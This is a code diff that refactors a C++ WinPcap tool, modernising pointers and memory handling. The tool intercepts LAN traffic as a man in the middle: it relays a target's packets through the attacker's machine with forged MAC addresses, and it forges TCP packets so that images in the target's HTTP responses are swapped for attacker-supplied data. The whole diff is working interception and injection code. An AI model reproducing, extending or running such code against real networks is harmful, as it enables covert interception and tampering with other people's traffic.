@@ -6,16 +6,16 @@
 volatile BOOL g_programRunning = TRUE;
 volatile BOOL g_attacking = FALSE;
 
-pcap_if_t* g_deviceList = NULL;
-pcap_if_t* g_adapter = NULL;
+pcap_if_t* g_deviceList = nullptr;
+pcap_if_t* g_adapter = nullptr;
 DWORD g_selfIp = 0;
 MacAddress g_selfMac;
 DWORD g_selfGateway = 0;
 MacAddress g_gatewayMac;
 
-map<DWORD, HostInfoSetting> g_host;
-map<DWORD, HostInfoSetting*> g_attackList;
-map<MacAddress, HostInfoSetting*> g_attackListMac;
+std::map<DWORD, HostInfoSetting> g_host;
+std::map<DWORD, std::unique_ptr<HostInfoSetting> > g_attackList;
+std::map<MacAddress, std::unique_ptr<HostInfoSetting> > g_attackListMac;
 CCriticalSection g_hostAttackListLock;
 
 
@@ -34,13 +34,13 @@ BOOL inputIp(LPCSTR src, DWORD& dest)
 
 BOOL GetAdapterHandle(pcap_t*& adapter)
 {
-	if (g_adapter == NULL)
+	if (g_adapter == nullptr)
 		return FALSE;
 	// open adapter
 	char errBuf[PCAP_ERRBUF_SIZE];
-	if ((adapter = pcap_open_live(g_adapter->name, 65536, 1, 1000, errBuf)) == NULL)
+	if ((adapter = pcap_open_live(g_adapter->name, 65536, 1, 1000, errBuf)) == nullptr)
 	{
-		MessageBox(NULL, "Error in pcap_open_live: " + CString(g_adapter->name) + " is not supported by WinPcap", "", MB_ICONERROR);
+		AfxMessageBox("Error in pcap_open_live: " + CString(g_adapter->name) + " is not supported by WinPcap", MB_ICONERROR);
 		return FALSE;
 	}
 	return TRUE;
@@ -48,7 +48,7 @@ BOOL GetAdapterHandle(pcap_t*& adapter)
 
 void SetFilter(pcap_t* adapter, LPCSTR exp)
 {
-	ULONG netmask = g_adapter->addresses == NULL ? 0x00FFFFFF : ((sockaddr_in*)g_adapter->addresses->netmask)->sin_addr.S_un.S_addr;
+	ULONG netmask = g_adapter->addresses == nullptr ? 0x00FFFFFF : ((sockaddr_in*)g_adapter->addresses->netmask)->sin_addr.S_un.S_addr;
 	bpf_program fcode;
 	pcap_compile(adapter, &fcode, exp, 1, netmask);
 	pcap_setfilter(adapter, &fcode);
@@ -80,28 +80,29 @@ static UINT AFX_CDECL ReplaceImageThread(LPVOID param)
 	DWORD tcpLen = pInitTcp->headerLen * 4;
 
 
+#pragma region Receive Image
+	///////////////////////////////////////////////////////////////////////////////////
 	// receive image, you can write it to a file
-#pragma region
 	{
-	BYTE* ackPkt = new BYTE[ETH_LENGTH + ipLen + tcpLen];
-	*(MacAddress*)ackPkt = g_gatewayMac;
-	*(MacAddress*)(ackPkt + 6) = g_selfMac;
-	memcpy(ackPkt + 12, link.initPacket + 12, 2 + ipLen + tcpLen);
-	IPPacket* pPktIp = (IPPacket*)(ackPkt + ETH_LENGTH);
+	std::unique_ptr<BYTE[]> ackPkt(new BYTE[ETH_LENGTH + ipLen + tcpLen]);
+	*(MacAddress*)ackPkt.get() = g_gatewayMac;
+	*(MacAddress*)(ackPkt.get() + 6) = g_selfMac;
+	memcpy(ackPkt.get() + 12, link.initPacket.get() + 12, 2 + ipLen + tcpLen);
+	IPPacket* pPktIp = (IPPacket*)(ackPkt.get() + ETH_LENGTH);
 	pPktIp->identification = htons(ntohs(pPktIp->identification) + 1);
 	pPktIp->totalLen = htons((WORD)(ipLen + tcpLen));
 	pPktIp->timeToLive = 64;
 	pPktIp->sourceIp = targetIp;
 	pPktIp->destinationIp = pInitIp->sourceIp;
 	pPktIp->CalcCheckSum();
-	TCPPacket* pPktTcp = (TCPPacket*)(ackPkt + ETH_LENGTH + ipLen);
+	TCPPacket* pPktTcp = (TCPPacket*)(ackPkt.get() + ETH_LENGTH + ipLen);
 	pPktTcp->sourcePort = targetPort;
 	pPktTcp->destinationPort = pInitTcp->sourcePort;
 	pPktTcp->seq = pInitTcp->ack;
 	pPktTcp->ack = htonl(ntohl(pInitTcp->seq) + (link.initPacketLen - ETH_LENGTH - ipLen - tcpLen));
 	pPktTcp->psh = 0;
 	pPktTcp->CalcCheckSum(pPktIp->sourceIp, pPktIp->destinationIp, (WORD)tcpLen);
-	pcap_sendpacket(adapter, (u_char*)ackPkt, ETH_LENGTH + sizeof(IPPacket) + sizeof(TCPPacket));
+	pcap_sendpacket(adapter, (u_char*)ackPkt.get(), ETH_LENGTH + sizeof(IPPacket)+sizeof(TCPPacket));
 
 	CString exp;
 	BYTE* bIp = (BYTE*)&target.ip;
@@ -128,31 +129,32 @@ static UINT AFX_CDECL ReplaceImageThread(LPVOID param)
 			lastAck = ack;
 		pPktTcp->ack = htonl(lastAck);
 		pPktTcp->CalcCheckSum(pPktIp->sourceIp, pPktIp->destinationIp, (WORD)tcpLen);
-		pcap_sendpacket(adapter, (u_char*)ackPkt, ETH_LENGTH + sizeof(IPPacket)+sizeof(TCPPacket));
+		pcap_sendpacket(adapter, (u_char*)ackPkt.get(), ETH_LENGTH + sizeof(IPPacket)+sizeof(TCPPacket));
 		if (pCurTcp->psh)
 			break;
 	}
-	delete ackPkt;
 	}
+	///////////////////////////////////////////////////////////////////////////////////
 #pragma endregion
 
 
 	// send image
 	DWORD sendBufLen = link.initPacketLen > 1000 ? link.initPacketLen : 1000;
-	BYTE* sendBuf = new BYTE[sendBufLen];
+	std::unique_ptr<BYTE[]> sendBuf(new BYTE[sendBufLen]);
 
+#pragma region Initial Packet
+	///////////////////////////////////////////////////////////////////////////////////
 	// send HTTP header in the initial packet
-#pragma region InitPacket
 	LPCSTR pHttp = (LPCSTR)&link.initPacket[ETH_LENGTH + ipLen + tcpLen];
 	LPCSTR pContentType = strstr(pHttp, "Content-Type: image/");
 	LPCSTR pContentLen = strstr(pHttp, "Content-Length: ") + strlen("Content-Length: ");
 	DWORD httpHeaderLen = strstr(pHttp, "\r\n\r\n") + strlen("\r\n\r\n") - pHttp;
 
-	*(MacAddress*)sendBuf = target.mac;					// destination MAC
-	*(MacAddress*)(sendBuf + 6) = g_selfMac;			// source MAC
+	*(MacAddress*)sendBuf.get() = target.mac;					// destination MAC
+	*(MacAddress*)(sendBuf.get() + 6) = g_selfMac;			// source MAC
 
-	BYTE* p1 = sendBuf + 12;
-	const BYTE* p2 = link.initPacket + 12;
+	BYTE* p1 = sendBuf.get() + 12;
+	const BYTE* p2 = link.initPacket.get() + 12;
 	DWORD len;
 	if (pContentType < pContentLen)
 	{
@@ -194,7 +196,7 @@ static UINT AFX_CDECL ReplaceImageThread(LPVOID param)
 	p1 += len;
 
 
-	DWORD totalLen = p1 - sendBuf;
+	DWORD totalLen = p1 - sendBuf.get();
 	IPPacket* pIp = (IPPacket*)&sendBuf[ETH_LENGTH];
 	pIp->totalLen = htons((u_short)(totalLen - ETH_LENGTH));		// IP total length
 	pIp->CalcCheckSum();											// IP checksum
@@ -202,20 +204,22 @@ static UINT AFX_CDECL ReplaceImageThread(LPVOID param)
 	pTcp->psh = 0;
 	pTcp->CalcCheckSum(pIp->sourceIp, pIp->destinationIp, p1 - (BYTE*)pTcp); // TCP checksum
 
-	pcap_sendpacket(adapter, (u_char*)sendBuf, totalLen);
+	pcap_sendpacket(adapter, (u_char*)sendBuf.get(), totalLen);
 	pTcp->seq = htonl(ntohl(pTcp->seq) + (totalLen - ETH_LENGTH - ipLen - tcpLen));
+	///////////////////////////////////////////////////////////////////////////////////
 #pragma endregion
 
+	///////////////////////////////////////////////////////////////////////////////////
 	// send image
 	BYTE* pTcpData = (BYTE*)pTcp + tcpLen;
-	DWORD maxTcpDataLen = sendBuf + sendBufLen - pTcpData;
+	DWORD maxTcpDataLen = sendBuf.get() + sendBufLen - pTcpData;
 	pIp->totalLen = htons((u_short)(sendBufLen - ETH_LENGTH));		// IP total length
 	pIp->CalcCheckSum();											// IP checksum
 	DWORD start;
 	for (start = 0; start + maxTcpDataLen < target.imageDataLen - 1; start += maxTcpDataLen)
 	{
 		target.imageDataLock.Lock();
-		if (target.imageData == NULL)
+		if (target.imageData == nullptr)
 		{
 			target.imageDataLock.Unlock();
 			goto End;
@@ -223,14 +227,14 @@ static UINT AFX_CDECL ReplaceImageThread(LPVOID param)
 		memcpy(pTcpData, &target.imageData[start], maxTcpDataLen);
 		target.imageDataLock.Unlock();
 		pTcp->CalcCheckSum(pIp->sourceIp, pIp->destinationIp, (WORD)(tcpLen + maxTcpDataLen)); // TCP checksum
-		pcap_sendpacket(adapter, (u_char*)sendBuf, sendBufLen);
+		pcap_sendpacket(adapter, (u_char*)sendBuf.get(), sendBufLen);
 		pTcp->seq = htonl(ntohl(pTcp->seq) + maxTcpDataLen);
 	}
 
 	// last packet
 	DWORD lastTcpDataLen = target.imageDataLen - start;
 	target.imageDataLock.Lock();
-	if (target.imageData == NULL)
+	if (target.imageData == nullptr)
 	{
 		target.imageDataLock.Unlock();
 		goto End;
@@ -242,12 +246,13 @@ static UINT AFX_CDECL ReplaceImageThread(LPVOID param)
 	pTcp->psh = 1;
 	pTcp->fin = 1;
 	pTcp->CalcCheckSum(pIp->sourceIp, pIp->destinationIp, (WORD)(tcpLen + lastTcpDataLen)); // TCP checksum
-	pcap_sendpacket(adapter, (u_char*)sendBuf, ETH_LENGTH + ntohs(pIp->totalLen));
+	pcap_sendpacket(adapter, (u_char*)sendBuf.get(), ETH_LENGTH + ntohs(pIp->totalLen));
+	///////////////////////////////////////////////////////////////////////////////////
 
 
+	///////////////////////////////////////////////////////////////////////////////////
 	// release
 End:
-	delete sendBuf;
 	pcap_close(adapter);
 	target.httpImageLinkLock.Lock();
 	target.httpImageLink.erase(targetPort);
@@ -301,12 +306,11 @@ UINT AFX_CDECL PacketHandleThread(LPVOID _thiz)
 					target.httpImageLinkLock.Unlock();
 				}
 
-				BYTE* newData = new BYTE[header->len];
-				*(MacAddress*)newData = g_gatewayMac; // destination MAC
-				*(MacAddress*)(newData + 6) = g_selfMac; // source MAC
-				memcpy(newData + 12, pkt_data + 12, header->len - 12); // data
-				pcap_sendpacket(adapter, (u_char*)newData, header->len);
-				delete newData;
+				std::unique_ptr<BYTE[]> newData(new BYTE[header->len]);
+				*(MacAddress*)newData.get() = g_gatewayMac; // destination MAC
+				*(MacAddress*)(newData.get() + 6) = g_selfMac; // source MAC
+				memcpy(newData.get() + 12, pkt_data + 12, header->len - 12); // data
+				pcap_sendpacket(adapter, (u_char*)newData.get(), header->len);
 			}
 			continue;
 		}
@@ -331,7 +335,7 @@ UINT AFX_CDECL PacketHandleThread(LPVOID _thiz)
 			DWORD ipLength = pIp->headerLen * 4;
 			TCPPacket* pTcp = (TCPPacket*)&pkt_data[ETH_LENGTH + ipLength];
 
-			if (!target.replaceImages || target.imageData == NULL) // no replacing
+			if (!target.replaceImages || target.imageData == nullptr) // no replacing
 				goto Forward;
 
 			// is replacing
@@ -351,7 +355,7 @@ UINT AFX_CDECL PacketHandleThread(LPVOID _thiz)
 			LPCSTR http = (LPCSTR)&pkt_data[ETH_LENGTH + ipLength + tcpLength];
 			LPCSTR contentType = strstr(http, "Content-Type: image/");
 			// not image
-			if (contentType == NULL)
+			if (contentType == nullptr)
 				goto Forward;
 
 				
@@ -361,8 +365,8 @@ UINT AFX_CDECL PacketHandleThread(LPVOID _thiz)
 			target.httpImageLinkLock.Unlock();
 			link.sourcePort = pTcp->sourcePort;
 			link.initPacketLen = header->len;
-			link.initPacket = new BYTE[header->len];
-			memcpy(link.initPacket, pkt_data, header->len);
+			link.initPacket.reset(new BYTE[header->len]);
+			memcpy(link.initPacket.get(), pkt_data, header->len);
 			DWORD* param = new DWORD[2];
 			param[0] = target.ip;
 			param[1] = pTcp->destinationPort;
@@ -372,12 +376,11 @@ UINT AFX_CDECL PacketHandleThread(LPVOID _thiz)
 Forward:
 			if (target.forward)
 			{
-				BYTE* newData = new BYTE[header->len];
-				*(MacAddress*)newData = target.mac; // destination MAC
-				*(MacAddress*)(newData + 6) = g_selfMac; // source MAC
-				memcpy(newData + 12, pkt_data + 12, header->len - 12); // data
-				pcap_sendpacket(adapter, (u_char*)newData, header->len);
-				delete newData;
+				std::unique_ptr<BYTE[]> newData(new BYTE[header->len]);
+				*(MacAddress*)newData.get() = target.mac; // destination MAC
+				*(MacAddress*)(newData.get() + 6) = g_selfMac; // source MAC
+				memcpy(newData.get() + 12, pkt_data + 12, header->len - 12); // data
+				pcap_sendpacket(adapter, (u_char*)newData.get(), header->len);
 			}
 			continue;
 		}
